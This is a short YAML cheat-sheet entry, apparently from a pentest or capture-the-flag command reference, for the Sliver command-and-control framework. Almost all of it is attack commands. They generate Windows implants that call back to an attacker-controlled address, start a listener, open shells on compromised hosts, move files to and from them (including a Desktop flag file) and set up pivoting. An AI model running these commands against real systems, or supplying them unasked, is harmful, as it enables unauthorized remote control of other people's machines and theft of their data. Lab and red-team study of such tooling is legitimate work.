---
description: |
  Sliver C2 framework — generate implants, establish sessions,
  and manage compromised hosts. Open-source alternative to Cobalt Strike.
command: |
  # Start Sliver server
  sliver-server

  # Generate implant (beacon)
  generate beacon --mtls 10.10.14.1 --os windows --arch amd64 --save implant.exe

  # Generate implant (session)
  generate --mtls 10.10.14.1 --os windows --arch amd64 --save implant.exe

  # Start listener
  mtls --lhost 10.10.14.1 --lport 8888

  # After session established
  use [SESSION_ID]
  info
  shell
  upload /tmp/file C:\\Temp\\file
  download C:\\Users\\admin\\Desktop\\flag.txt /tmp/flag.txt

  # Pivoting
  pivots tcp --bind 0.0.0.0 --lport 9898
phase:
  - Exploitation
  - Post-Exploitation
  - Lateral_Movement
target_os:
  - Linux
  - Windows
services: []
items:
  - No_Creds
  - Shell
techniques:
  - Reverse_Shell
  - Pivoting_Tunneling
network_position:
  - External
  - Internal
references:
  - https://github.com/BishopFox/sliver
---
